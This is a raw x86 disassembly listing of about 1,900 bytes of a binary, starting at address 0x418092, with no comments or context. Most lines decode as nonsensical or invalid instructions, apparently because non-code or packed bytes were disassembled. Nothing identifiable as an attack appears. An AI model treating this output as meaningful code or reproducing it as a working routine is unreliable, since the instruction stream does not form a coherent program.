  418092:	inc    DWORD PTR [ebp+0x4508f8ff]
  418098:	mov    edi,DWORD PTR [eax+edx*8]
  41809b:	pushf  
  41809c:	jo     0x418065
  41809e:	cmp    DWORD PTR [eax-0x7a87af0],0x46
  4180a5:	inc    ebp
  4180a6:	add    BYTE PTR [esi],bh
  4180a8:	push   0x8b809c
  4180ad:	in     al,dx
  4180ae:	inc    ebp
  4180af:	push   ebp
  4180b0:	mov    esi,DWORD PTR [ebx]
  4180b2:	cld    
  4180b3:	add    eax,DWORD PTR [eax+0xf013b]
  4180b9:	adc    al,0x0
  4180bb:	add    bh,bh
  4180bd:	jmp    0xbe81da
  4180c2:	add    BYTE PTR [ebp+0x45],cl
  4180c5:	mov    ecx,DWORD PTR [ebx+0xd1d8e8]
  4180cb:	dec    ebp
  4180cc:	push   0x38033
  4180d1:	cmp    eax,DWORD PTR [eax]
  4180d3:	unpcklps xmm7,xmm0
  4180d6:	jne    0x4180d8
  4180d8:	dec    DWORD PTR [ebx+0x5545cc18]
  4180de:	mov    DWORD PTR [ebx],esi
  4180e0:	shl    BYTE PTR [ebx],1
  4180e2:	inc    ebp
  4180e3:	add    ecx,DWORD PTR [ecx+0x60fc803]
  4180e9:	retf   0x5575
  4180ec:	dec    DWORD PTR [ebx-0x5ba17e8]
  4180f2:	(bad)  
  4180f3:	stc    
  4180f4:	in     al,dx
  4180f5:	or     al,0x85
  4180f7:	dec    ebp
  4180f8:	clc    
  4180f9:	xor    eax,DWORD PTR [ebp+0x3]
  4180fc:	mov    ebp,ecx
  4180fe:	rol    BYTE PTR [eax],1
  418100:	inc    ebp
  418101:	add    BYTE PTR [eax-0x7747ab3],bh
  418107:	clc    
  418108:	inc    ebp
  418109:	retf   
  41810a:	mov    edx,ebx
  41810c:	in     al,dx
  41810d:	(bad)  
  41810e:	retf   
  41810f:	into   
  418110:	into   
  418111:	scas   eax,DWORD PTR es:[edi]
  418112:	dec    ebp
  418113:	mov    ecx,DWORD PTR [ebx-0x3482130c]
  418119:	sub    ecx,esi
  41811b:	cmp    ecx,DWORD PTR [ebp+0x77]
  41811e:	(bad)  
  41811f:	mov    edi,eax
  418121:	int3   
  418122:	test   DWORD PTR [ecx-0x74baff08],ecx
  418128:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  41812f:	xor    eax,DWORD PTR [ebp+0x4503f803]
  418135:	(bad)  
  418137:	retf   0x559c
  41813a:	(bad)  
  41813b:	mov    esp,DWORD PTR [eax+ebp*8-0x607057b]
  418142:	inc    ebp
  418143:	add    eax,0xeb9c4d3f
  418148:	(bad)  
  418149:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  41814f:	xor    ecx,DWORD PTR [ebp+0x33]
  418152:	mov    eax,DWORD PTR [ebx]
  418154:	call   0xce514c5c
  418159:	retf   0x55d1
  41815c:	test   BYTE PTR [ebx-0x5ff17fe],cl
  418162:	jmp    0x41815d
  418164:	add    BYTE PTR ds:0xebf44d8b,al
  41816a:	push   ebp
  41816b:	mov    ebp,DWORD PTR [ebx]
  41816d:	mov    eax,0x33f8558b
  418172:	retf   
  418173:	xor    ecx,esi
  418175:	add    edx,ecx
  418177:	add    eax,DWORD PTR [edx+0xca010f]
  41817d:	push   ebp
  41817e:	dec    ebp
  41817f:	mov    ecx,DWORD PTR [ebx-0x34050718]
  418185:	stc    
  418186:	rol    DWORD PTR ds:0xebce4dd6,cl
  41818c:	scas   eax,DWORD PTR es:[edi]
  41818d:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  418193:	xor    ebp,DWORD PTR [ebx]
  418195:	xor    edi,DWORD PTR [ebx]
  418197:	add    esi,DWORD PTR [edi+0x3]
  41819a:	mov    ecx,DWORD PTR [edi]
  41819c:	clc    
  41819d:	retf   0x55cb
  4181a0:	into   
  4181a1:	mov    edi,DWORD PTR [eax+ebp*8-0x6740600]
  4181a8:	test   al,0x4d
  4181aa:	push   ebp
  4181ab:	jbe    0x4181e0
  4181ad:	mov    esi,DWORD PTR [ebx]
  4181af:	mov    al,0x3
  4181b1:	push   ebp
  4181b2:	add    esi,DWORD PTR [ebx]
  4181b4:	rdpmc  
  4181b6:	retf   0x5503
  4181b9:	add    ecx,DWORD PTR [ebx-0x53517f1]
  4181bf:	dec    ebp
  4181c0:	stc    
  4181c1:	mov    ecx,DWORD PTR [eax]
  4181c3:	or     BYTE PTR [ebp+0x4d],cl
  4181c6:	jmp    0x1358256
  4181cb:	dec    ebp
  4181cc:	dec    ebp
  4181cd:	(bad)  
  4181ce:	mov    ebx,esp
  4181d0:	clc    
  4181d1:	test   ebx,ecx
  4181d3:	clc    
  4181d4:	ror    DWORD PTR [ebp-0x2a],cl
  4181d7:	mov    esi,ecx
  4181d9:	lock scas eax,DWORD PTR es:[edi]
  4181db:	inc    ebp
  4181dc:	mov    esi,DWORD PTR [ebx]
  4181de:	hlt    
  4181df:	pushf  
  4181e0:	jge    0x41816d
  4181e2:	sub    ebx,esp
  4181e4:	cmp    ecx,ebx
  4181e6:	ja     0x4181b6
  4181e8:	mov    ebp,DWORD PTR [eax-0x58]
  4181eb:	dec    ebp
  4181ec:	xor    ecx,DWORD PTR [di+0x3]
  4181f0:	mov    esp,esp
  4181f2:	clc    
  4181f3:	push   ebp
  4181f4:	retf   
  4181f5:	mov    dl,bl
  4181f7:	adc    esi,edx
  4181f9:	jb     0x4181c9
  4181fb:	add    BYTE PTR [edi-0xb7474b3],ch
  418201:	lock jge 0x4181cf
  418204:	sub    ecx,DWORD PTR [ebp+0x3b]
  418207:	mov    esi,DWORD PTR [edi-0x20]
  41820a:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459c]
  418211:	mov    BYTE PTR [ebx-0x34b20729],cl
  418217:	mov    edx,ebx
  418219:	lock (bad) 
  41821b:	ror    esi,cl
  41821d:	push   ebp
  41821e:	scas   eax,DWORD PTR es:[edi]
  41821f:	mov    ecx,DWORD PTR [ebx+0x7d8cf4e0]
  418225:	pushf  
  418226:	sub    esi,DWORD PTR [edx]
  418228:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  41822e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41822f:	xor    esp,DWORD PTR [ebx]
  418231:	add    ecx,DWORD PTR [ebp-0x1c]
  418234:	mov    edi,DWORD PTR [ebp-0x8]
  418237:	mov    bl,cl
  418239:	cmp    dl,bl
  41823b:	jb     0x41820b
  41823d:	add    dh,dl
  41823f:	dec    ebp
  418240:	scas   eax,DWORD PTR es:[edi]
  418241:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  418247:	shr    DWORD PTR [ebx],cl
  418249:	into   
  41824a:	cmp    edx,esi
  41824c:	mov    ebp,DWORD PTR [edi-0x1bfcfc48]
  418252:	dec    ebp
  418253:	dec    ebp
  418254:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  41825a:	retf   
  41825b:	xor    edx,esi
  41825d:	add    ecx,esi
  41825f:	imul   ecx,edx
  418262:	mov    DWORD PTR [ebp+0x8],edx
  418265:	xor    ecx,DWORD PTR [ebp+0x2b]
  418268:	mov    DWORD PTR [ebx+0x7d4df0ec],ecx
  41826e:	add    esi,DWORD PTR [ebx]
  418270:	rol    BYTE PTR [ebx],0x45
  418273:	rdtsc  
  418275:	xlat   BYTE PTR ds:[ebx]
  418276:	pushf  
  418277:	jge    0x418202
  418279:	xor    esp,eax
  41827b:	sub    eax,DWORD PTR [ebp-0x73]
  41827e:	(bad)  
  41827f:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  418286:	dec    ebp
  418287:	xchg   BYTE PTR [ebx],dh
  418289:	inc    DWORD PTR [ebx]
  41828b:	(bad)  
  41828c:	jmp    0x4182db
  41828e:	mov    ecx,DWORD PTR [ebx-0x34341324]
  418294:	dec    ebp
  418295:	into   
  418296:	mov    ebp,DWORD PTR [edi-0x23737420]
  41829c:	pushf  
  41829d:	shl    DWORD PTR [edx],cl
  41829f:	retf   0x5588
  4182a2:	or     ecx,DWORD PTR [ebp+0x7233114d]
  4182a8:	add    eax,DWORD PTR [eax]
  4182aa:	in     al,0x4d
  4182ac:	push   ebp
  4182ad:	mov    ecx,DWORD PTR [edx+0x72cb11d8]
  4182b3:	fs add ch,cl
  4182b6:	dec    ebp
  4182b7:	sub    ecx,DWORD PTR [edx+0x55e80b03]
  4182bd:	dec    ebp
  4182be:	xor    ecx,DWORD PTR [ebx-0x341b0bfd]
  4182c4:	jge    0x418294
  4182c6:	mov    BYTE PTR [edi+0xf723b3a],ch
  4182cc:	add    cl,dh
  4182ce:	dec    ebp
  4182cf:	dec    DWORD PTR [ebx-0x2c032301]
  4182d5:	inc    ebp
  4182d6:	push   ebp
  4182d7:	dec    DWORD PTR [ebx-0x73ff1f34]
  4182dd:	lea    ebx,[esp+edx*2+0x508bff32]
  4182e4:	mov    ah,0x45
  4182e6:	push   ebp
  4182e7:	mov    esi,DWORD PTR [ebx]
  4182e9:	les    esi,FWORD PTR [ebx]
  4182eb:	add    BYTE PTR [ebx],al
  4182ed:	inc    DWORD PTR [ebx]
  4182ef:	mov    ecx,DWORD PTR [edi]
  4182f1:	cld    
  4182f2:	retf   0x4d80
  4182f5:	add    DWORD PTR [ecx+0x4d30e400],ecx
  4182fb:	jne    0x418288
  4182fd:	(bad)  
  4182fe:	in     al,dx
  4182ff:	ror    bl,1
  418301:	scas   al,BYTE PTR es:[edi]
  418302:	into   
  418303:	add    BYTE PTR [edi-0xf2f7475],ch
  418309:	not    bl
  41830b:	adc    al,0xca
  41830d:	inc    ebp
  41830e:	push   ebp
  41830f:	mov    ecx,DWORD PTR [ebx-0x2cff1b28]
  418315:	push   0xaf80d6
  41831a:	mov    eax,DWORD PTR [eax]
  41831c:	fdiv   st(7),st
  41831e:	sti    
  41831f:	sbb    dh,cl
  418321:	pop    esi
  418322:	xchg   esp,eax
  418323:	leave  
  418324:	pushf  
  418325:	add    al,0x32
  418327:	push   ebp
  418328:	cmp    ebp,esp
  41832a:	sqrtps xmm3,XMMWORD PTR [esi+0x45]
  41832e:	dec    DWORD PTR [ecx-0x740f0375]
  418334:	push   ebp
  418335:	cld    
  418336:	xor    ecx,DWORD PTR [edi-0x76f07efd]
  41833c:	retf   0x558b
  41833f:	clc    
  418340:	xor    esi,eax
  418342:	add    esi,DWORD PTR [ebp-0x75]
  418345:	(bad)  
  418346:	hlt    
  418347:	or     cl,BYTE PTR [esi+eax*8-0x39cdf764]
  41834e:	mov    DWORD PTR [edx],ecx
  418350:	hlt    
  418351:	(bad)  
  418352:	dec    ebp
  418353:	add    dh,BYTE PTR [ebx]
  418355:	leave  
  418356:	mov    edx,0xffec8d55
  41835b:	push   ecx
  41835c:	rol    DWORD PTR [ebp+0x55],1
  41835f:	mov    DWORD PTR [ebx+0x7d55d8fc],ecx
  418365:	mov    eax,0xf8030b33
  41836a:	lar    ecx,di
  41836d:	push   ebp
  41836e:	retf   0x863b
  418371:	jne    0x418370
  418373:	mov    edi,edi
  418375:	or     BYTE PTR [ebp+0x41],dh
  418378:	mov    ebp,esp
  41837a:	cld    
  41837b:	inc    eax
  41837c:	mov    al,0x25
  41837e:	add    DWORD PTR [ecx+0x0],eax
  418381:	in     eax,dx
  418382:	test   DWORD PTR [ecx-0x1],eax
  418385:	fdiv   st(7),st
  418387:	ret    0x8b
  41838a:	cld    
  41838b:	mov    eax,DWORD PTR [eax+0x8d0151]
  418391:	clc    
  418392:	xor    BYTE PTR [ebp+0x45],al
  418395:	mov    ecx,DWORD PTR [ebx+0x8fc0fc]
  41839b:	loopne 0x41839c
  41839d:	mov    edi,edi
  41839f:	mov    ecx,eax
  4183a1:	clc    
  4183a2:	jne    0x418374
  4183a4:	call   0x8294ad
  4183a9:	and    eax,0xc6854575
  4183ae:	je     0x4183b1
  4183b0:	mov    eax,esi
  4183b2:	cld    
  4183b3:	or     DWORD PTR [eax+0x401c9],eax
  4183b9:	push   ebp
  4183ba:	add    ah,ch
  4183bc:	add    BYTE PTR [ecx+0x6a],dl
  4183bf:	inc    ebp
  4183c0:	push   esi
  4183c1:	mov    DWORD PTR [eax-0x4],edx
  4183c4:	pop    edi
  4183c5:	mov    ebx,DWORD PTR [ebx-0x4]
  4183c8:	ret    0xbe
  4183cb:	push   es
  4183cc:	mov    ecx,DWORD PTR [ecx-0x77274af]
  4183d2:	clc    
  4183d3:	lock inc ebp
  4183d5:	jne    0x41842d
  4183d7:	(bad)  
  4183d8:	jne    0x4183de
  4183da:	mov    eax,0xf841ba66
  4183df:	fadd   QWORD PTR [esi]
  4183e1:	(bad)  
  4183e2:	jne    0x418421
  4183e4:	cmp    eax,ebx
  4183e6:	pop    esi
  4183e7:	mov    ecx,DWORD PTR [eax]
  4183e9:	push   ecx
  4183ea:	inc    ecx
  4183eb:	lea    esi,[eax-0x8]
  4183ee:	inc    edx
  4183ef:	inc    ebp
  4183f0:	int    0x8b
  4183f2:	inc    edx
  4183f3:	cld    
  4183f4:	jo     0x4183b5
  4183f6:	inc    ecx
  4183f7:	xchg   edx,esp
  4183f9:	mov    ebx,eax
  4183fb:	mov    ecx,DWORD PTR [ebx-0x722fae08]
  418401:	or     edi,eax
  418403:	inc    ebp
  418404:	inc    ebp
  418405:	(bad)  
  418406:	mov    ecx,DWORD PTR [eax]
  418408:	cld    
  418409:	(bad)  
  41840a:	jmp    0x41840d
  41840c:	mov    eax,esi
  41840e:	mov    DWORD PTR ds:0x4f8c98b,eax
  418414:	rcl    BYTE PTR [esi+0xf],1
  418417:	iret   
  418418:	inc    ebp
  418419:	leave  
  41841a:	(bad)  
  41841b:	dec    DWORD PTR [ecx]
  41841d:	mov    eax,esi
  41841f:	mov    eax,DWORD PTR [edi]
  418421:	mov    dh,0xdd
  418424:	push   es
  418425:	nop
  418426:	(bad)  
  418427:	inc    DWORD PTR [ebx]
  418429:	push   esi
  41842a:	leave  
  41842b:	iret   
  41842c:	add    al,0x46
  41842e:	push   ebp
  41842f:	jmp    0xff92da20
  418434:	inc    ebp
  418435:	push   esi
  418436:	mov    DWORD PTR [esi-0x4],eax
  418439:	in     eax,dx
  41843a:	push   ebp
  41843b:	sbb    BYTE PTR [eax+0x7c6daff],bh
  418441:	add    al,BYTE PTR [edx]
  418443:	mov    edx,DWORD PTR [ebp-0x17]
  418446:	cmp    edi,esi
  418448:	jne    0x418449
  41844a:	(bad)  
  41844b:	push   esi
  41844c:	pop    es
  41844d:	push   ebp
  41844e:	mov    ebp,esp
  418450:	or     BYTE PTR [ebp+0x41],al
  418453:	add    edi,esp
  418455:	sub    BYTE PTR [eax-0x4],al
  418458:	int3   
  418459:	jne    0x41841d
  41845b:	add    DWORD PTR [eax],eax
  41845d:	sbb    al,0x8b
  41845f:	mov    edx,DWORD PTR [ecx+0x14]
  418462:	lea    edx,[edx-0x1ba7508]
  418468:	push   esi
  418469:	enter  0xd375,0xb8
  41846d:	test   DWORD PTR [esi],0x6ce0750
  418473:	enter  0xd375,0x3b
  418477:	neg    DWORD PTR [esi+0x50]
  41847a:	or     cl,dl
  41847c:	inc    edx
  41847d:	(bad)  
  41847e:	loope  0x41846c
  418480:	(bad)  
  418481:	sub    eax,DWORD PTR [ebx]
  418483:	inc    eax
  418484:	loope  0x4184d6
  418486:	add    dl,BYTE PTR [eax-0x37]
  418489:	push   edi
  41848a:	push   ebp
  41848b:	imul   ah
  41848d:	adc    DWORD PTR [ecx-0x1],0x45
  418491:	add    BYTE PTR [ecx+0x55d3fc00],cl
  418497:	lea    edi,[eax-0x7fff4ca]
  41849d:	mov    eax,0x4550402
  4184a2:	cmp    ebp,ecx
  4184a4:	jne    0x418451
  4184a6:	mov    eax,DWORD PTR ds:0x241e808
  4184ac:	in     eax,dx
  4184ad:	add    BYTE PTR [eax-0x7],al
  4184b0:	out    0x36,eax
  4184b2:	inc    ecx
  4184b3:	aas    
  4184b4:	jmp    0xcd4736
  4184b9:	lock mov edi,DWORD PTR [ebp-0x18]
  4184bd:	and    edi,edi
  4184bf:	mov    edi,edi
  4184c1:	call   0xe40f859d
  4184c6:	push   es
  4184c7:	add    al,ch
  4184c9:	ud0    edx,DWORD PTR [ebp-0x7574ff01]
  4184d0:	(bad)  
  4184d1:	hlt    
  4184d2:	add    eax,0xffd3e87d
  4184d7:	cmp    bh,0x8
  4184da:	(bad)  
  4184db:	fld    DWORD PTR [esi]
  4184dd:	out    dx,al
  4184de:	call   0xffa083e6
  4184e3:	cmp    al,0x46
  4184e5:	shl    edx,0x8
  4184e8:	(bad)  
  4184e9:	pop    es
  4184ea:	fisttp QWORD PTR [ebp+0xe577eff]
  4184f0:	push   ebx
  4184f1:	add    BYTE PTR [ebx+0x24008b56],cl
  4184f7:	add    BYTE PTR [ebp+0x50],al
  4184fa:	push   eax
  4184fb:	add    DWORD PTR [ebx+0x757d1834],ecx
  418501:	sub    edx,DWORD PTR [esi-0x24]
  418504:	jne    0x4184bc
  418506:	lods   eax,DWORD PTR ds:[esi]
  418507:	mov    edx,DWORD PTR [edx-0x34]
  41850a:	dec    esi
  41850b:	out    0x83,eax
  41850d:	into   
  41850e:	push   edi
  418510:	loopne 0x4184e0
  418512:	shr    BYTE PTR [edx+ecx*4+0x0],1
  418516:	xor    DWORD PTR [eax-0x741fff01],0xffffffd0
  41851d:	rol    DWORD PTR [edx],0x8
  418520:	mov    esp,ecx
  418522:	cmp    DWORD PTR [ebx],0xc
  418525:	mov    esi,0x5001c0
  41852a:	push   eax
  41852b:	push   cs
  41852c:	push   eax
  41852d:	(bad)  
  41852e:	sub    edx,edi
  418530:	push   esi
  418531:	adc    al,0xcb
  418533:	ins    DWORD PTR es:[edi],dx
  418534:	mov    eax,0x203e8
  418539:	add    al,ah
  41853b:	inc    esi
  41853c:	mov    al,ch
  41853e:	pop    es
  41853f:	add    DWORD PTR [eax],0x1
  418542:	add    dh,al
  418544:	add    ah,ch
  418546:	rol    DWORD PTR [edx-0xd],1
  418549:	cli    
  41854a:	push   0x4a
  41854c:	pop    ecx
  41854d:	retf   0xfe6
  418550:	add    BYTE PTR [ebx-0x4e72f41e],al
  418556:	(bad)  
  418557:	dec    BYTE PTR [ebx+0x45b1fc72]
  41855d:	(bad)  
  41855e:	sub    ebp,DWORD PTR [ebx]
  418560:	and    al,0x52
  418562:	(bad)  
  418563:	dec    edi
  418564:	inc    ebp
  418565:	shl    DWORD PTR [eax+0x24fe8c8],0x0
  41856c:	add    BYTE PTR [ebp-0x7b],dh
  41856f:	pop    eax
  418570:	add    BYTE PTR [edx+0x0],bl
  418573:	pop    edx
  418574:	dec    ebp
  418575:	jmp    DWORD PTR [ebx]
  418577:	and    al,0xec
  418579:	push   edx
  41857a:	out    0x64,eax
  41857c:	jmp    0xd3f37b81
  418581:	jmp    0x4185db
  418583:	mov    al,0xfe
  418585:	dec    BYTE PTR [ebp-0x18fd8018]
  41858b:	add    BYTE PTR [esi+ebp*1],bh
  41858e:	pop    edx
  41858f:	icebp  
  418590:	mov    eax,cs
  418592:	ins    BYTE PTR es:[edi],dx
  418593:	adc    eax,0x75510000
  418598:	mov    esi,0x70158
  41859d:	or     DWORD PTR [eax-0x74f48dfe],esi
  4185a3:	mov    edi,esp
  4185a5:	cld    
  4185a6:	jge    0x41861d
  4185a8:	(bad)  
  4185aa:	aas    
  4185ab:	and    al,0x6d
  4185ad:	adc    cl,0x1
  4185b0:	mov    eax,DWORD PTR [eax]
  4185b2:	and    ecx,DWORD PTR [ebx-0x167203fd]
  4185b8:	dec    ebp
  4185b9:	add    eax,ebp
  4185bb:	add    BYTE PTR [edx],al
  4185bd:	fadd   DWORD PTR [eax]
  4185bf:	stc    
  4185c0:	enter  0xee00,0x8b
  4185c4:	sbb    eax,0x1
  4185c7:	sbb    esi,ecx
  4185c9:	in     al,0x0
  4185cb:	in     eax,dx
  4185cc:	add    BYTE PTR [eax],al
  4185ce:	jne    0x41855b
  4185d0:	cmp    edx,esp
  4185d2:	jb     0x4185dd
  4185d4:	jmp    0x41864b
  4185d6:	mov    ecx,DWORD PTR [ebx+0x4d91d4cc]
  4185dc:	add    BYTE PTR [ebx+0x4d83d840],cl
  4185e2:	add    DWORD PTR [ebx+0x4d3bdcee],ecx
  4185e8:	jb     0x418573
  4185ea:	pop    edx
  4185eb:	fadd   QWORD PTR [ebx-0x7445faa1]
  4185f1:	or     dh,BYTE PTR [edx+0x0]
  4185f4:	inc    edx
  4185f5:	or     dl,bh
  4185f7:	xlat   BYTE PTR ds:[ebx]
  4185f8:	dec    edx
  4185f9:	push   edi
  4185fa:	add    al,0x7
  4185fc:	leave  
  4185fd:	rol    DWORD PTR [edx+eax*1],0x7
  418601:	add    ecx,ecx
  418603:	mov    edx,ecx
  418605:	int3   
  418606:	jmp    0x4185c6
  418608:	mov    al,0x0
  41860a:	(bad)  
  41860b:	jne    0x4185f5
  41860d:	mov    eax,DWORD PTR [edx]
  41860f:	call   0xc1560314
  418614:	pop    edi
  418615:	add    ebx,DWORD PTR [ecx-0x37]
  418618:	pop    ecx
  418619:	or     BYTE PTR [ecx*4-0x1445b8af],dh
  418620:	push   es
  418621:	mov    eax,DWORD PTR [eax]
  418623:	int3   
  418624:	add    ch,al
  418626:	jae    0x418610
  418628:	int    0x1
  41862a:	enter  0x3000,0x18
  41862e:	add    BYTE PTR [ebp+0x75],al
  418631:	mov    esi,DWORD PTR [eax-0x171f0134]
  418637:	push   0x2
  418639:	pop    ecx
  41863a:	add    BYTE PTR [eax],cl
  41863c:	push   ebx
  41863d:	lea    edi,[edi+eax*2]
  418640:	mov    al,0x1
  418642:	jb     0x418644
  418644:	mov    al,0x10
  418646:	push   eax
  418647:	add    al,0x75
  418649:	add    BYTE PTR [ebx],ch
  41864b:	add    ebx,esp
  41864d:	int3   
  41864e:	jne    0x418660
  418650:	movsx  edx,cl
  418653:	add    DWORD PTR [eax],eax
  418655:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  41865c:	mov    gs,edi
  41865e:	add    BYTE PTR [eax-0x50],ch
  418661:	add    al,ch
  418663:	mov    eax,DWORD PTR [ecx]
  418665:	sub    eax,DWORD PTR [eax]
  418667:	jb     0x4186de
  418669:	add    DWORD PTR [esp+eiz*8-0x50],esi
  41866d:	jge    0x418657
  41866f:	add    al,0x1
  418671:	add    DWORD PTR [eax],0x0
  418674:	jne    0x418676
  418676:	je     0x4186bd
  418678:	mov    eax,DWORD PTR [edi]
  41867a:	ror    BYTE PTR [ebp+0x4d],1
  41867d:	or     DWORD PTR [ecx+0x4d03d004],0x3
  418684:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  41868a:	mov    DWORD PTR [ebx],ebp
  41868c:	fadd   DWORD PTR [eax+0x75]
  41868f:	inc    eax
  418690:	pop    eax
  418691:	lea    ebx,[ecx+0x4f]
  418694:	push   0xb1000003
  418699:	out    dx,eax
  41869a:	add    ebp,DWORD PTR [edx+edx*2]
  41869d:	add    BYTE PTR [ebx+ecx*4],bh
  4186a0:	mov    ch,BYTE PTR [ebx]
  4186a2:	jb     0x418716
  4186a4:	add    al,0x89
  4186a6:	push   eax
  4186a7:	call   0x8429d419
  4186ac:	add    DWORD PTR [eax+eax*1],eax
  4186af:	jae    0x4186c5
  4186b1:	icebp  
  4186b2:	inc    ebp
  4186b3:	mov    eax,DWORD PTR gs:[ecx]
  4186b6:	int3   
  4186b7:	out    dx,al
  4186b8:	loopne 0x418707
  4186ba:	sub    eax,DWORD PTR [edx]
  4186bc:	push   0xffffff83
  4186be:	pop    esi
  4186bf:	push   cs
  4186c0:	jl     0x4186db
  4186c2:	add    al,0xaf
  4186c4:	xor    eax,0x832b6d00
  4186c9:	mov    eax,DWORD PTR [edx]
  4186cb:	rcr    BYTE PTR [ebp+0x754500dc],cl
  4186d1:	ror    DWORD PTR [ebx+0x7dc8e803],1
  4186d7:	inc    ebp
  4186d8:	shr    ebx,0x3
  4186db:	or     DWORD PTR [eax],0x4
  4186de:	push   0xffffffa5
  4186e0:	pop    esi
  4186e1:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  4186e8:	jmp    0x418747
  4186ea:	mov    edi,0xff0272
  4186ef:	fdivr  QWORD PTR [ebp+0x5d]
  4186f2:	push   0x4e
  4186f4:	pop    ecx
  4186f5:	call   0x41cafa
  4186fa:	mov    DWORD PTR [ebx],eax
  4186fc:	in     al,0xc8
  4186fe:	rol    BYTE PTR [ebp-0x75],0xc1
  418702:	call   0xab88e3
  418707:	pop    esi
  418708:	enter  0xceff,0x8b
  41870c:	repz mov ecx,DWORD PTR [ebp-0x34]
  418710:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  418717:	je     0x418719
  418719:	or     DWORD PTR [ebx-0x74183b24],eax
  41871f:	jne    0x418705
  418721:	jmp    0x41871c
  418723:	push   DWORD PTR [edx-0x24]
  418726:	push   0x4d
  418728:	pop    ecx
  418729:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  41872d:	jge    0x418735
  41872f:	mov    eax,eax
  418731:	sub    ebp,DWORD PTR [edx+0x24]
  418734:	pop    esi
  418735:	inc    ebp
  418736:	mov    esp,0x8b6077
  41873b:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  418741:	lods   al,BYTE PTR ds:[esi]
  418742:	add    BYTE PTR [ebx],bh
  418744:	enter  0xce73,0x49
  418748:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  418750:	stc    
  418751:	jge    0x4187c5
  418753:	jnp    0xdd410ab4
  418759:	call   0xc4882f
  41875e:	fadd   st(0),st
  418760:	dec    esi
  418761:	ins    BYTE PTR es:[edi],dx
  418762:	stc    
  418763:	cmp    al,0x73
  418765:	push   ebp
  418766:	mov    eax,0xf8028b
  41876b:	jne    0x41872e
  41876d:	mov    esi,ecx
  41876f:	mov    esp,DWORD PTR [ebp+0x2c]
  418772:	add    edi,DWORD PTR [ebp-0x24]
  418775:	sub    esp,eax
  418777:	and    al,0x45
  418779:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  41877f:	sbb    al,0xee
  418781:	pop    esi
  418782:	call   0x8187b2
  418787:	fsubr  st,st(3)
  418789:	sti    
  41878a:	add    BYTE PTR gs:[ecx],bh
  41878d:	add    eax,esp
  41878f:	add    DWORD PTR [esi],eax
  418791:	rol    DWORD PTR [ebp+0x8],0x29
  418795:	mov    esp,eax
  418797:	clc    
  418798:	jne    0x41880f
  41879a:	mov    eax,0x8b0673
  41879f:	loopne 0x4187e6
  4187a1:	loopne 0x41872c
  4187a3:	lods   al,BYTE PTR ds:[esi]
  4187a4:	int3   
  4187a5:	inc    ebp
  4187a6:	mov    DWORD PTR gs:[eax+edi*8],eax
  4187aa:	add    al,0xc3
  4187ac:	sub    ecx,DWORD PTR [ebp+0x47]
  4187af:	(bad)  
  4187b1:	shr    BYTE PTR [ebp-0x1f],0xe8
  4187b5:	add    eax,DWORD PTR [eax]
  4187b7:	call   0x64348bc
  4187bc:	add    esi,DWORD PTR [esi-0x3b2efc83]
  4187c2:	dec    esi
  4187c3:	ins    DWORD PTR es:[edi],dx
  4187c4:	in     al,dx
  4187c5:	lea    eax,[eax]
  4187c7:	inc    ebp
  4187c8:	inc    ebp
  4187c9:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  4187cf:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  4187d9:	and    al,0xdc
  4187db:	ror    DWORD PTR [edx+0x24],0xf7
  4187df:	or     BYTE PTR [ebp+0x4c],dh
  4187e2:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  4187e6:	stos   BYTE PTR es:[edi],al
  4187e7:	adc    edx,edi
  4187e9:	inc    esp
  4187ea:	add    edi,DWORD PTR [eax]
  4187ec:	jne    0x4187d1
  4187ee:	mov    DWORD PTR [eax-0x7449db04],ecx
  4187f4:	cmp    ecx,DWORD PTR [edi]
  4187f6:	sub    BYTE PTR [ebp-0x7e],dl
  4187f9:	sar    ebp,0xb
  4187fc:	jmp    FWORD PTR [edi+0x2400392a]
  418802:	sub    esi,DWORD PTR [ebx-0x73]
  418805:	mov    esp,DWORD PTR [ecx+edi*4]
  418808:	mov    ecx,DWORD PTR [eax]
  41880a:	and    BYTE PTR [eax],al
  41880c:	jne    0x4187d8
  41880e:	sub    ebp,ecx
  418810:	sbb    BYTE PTR [esi+0x32],ah
  418813:	dec    ebp
  418814:	push   ebp
  418815:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  41881b:	ret    
  41881c:	mov    edx,ebp
  41881e:	leave  
  41881f:	sub    DWORD PTR [esi+0x24],ebx
  418822:	ret    0x2b
  418825:	pop    ax
  418827:	push   ebp
  418828:	rol    BYTE PTR [ebx],0xeb
  41882b:	add    DWORD PTR [ecx+0x6c0001],0x40
  418832:	jb     0x418889
  418834:	ret    
  418835:	in     al,dx
  418836:	jecxz  0x4187c3
  418838:	push   esi
  418839:	xchg   esp,eax
  41883a:	jne    0x41883c
  41883c:	cmp    edx,DWORD PTR [esi+0x1c]
  41883f:	jne    0x418825
  418841:	mov    eax,DWORD PTR [ebp-0x77]
  418844:	ror    DWORD PTR [ebx+0x899408],0xe0
  41884b:	mov    esi,DWORD PTR [ebp-0x75]
  41884e:	pop    esi
  41884f:	nop
  418850:	mov    eax,DWORD PTR [eax]
  418852:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  418858:	add    al,0x0
  41885a:	inc    ebp
  41885b:	mov    eax,DWORD PTR [ebx]
  41885d:	mov    ebp,ebx
  41885f:	cmp    al,0xf
  418861:	or     al,al
  418863:	inc    ebp
  418864:	inc    ebp
  418865:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  41886b:	cld    
  41886c:	add    BYTE PTR [edi+0x556c16c0],dh
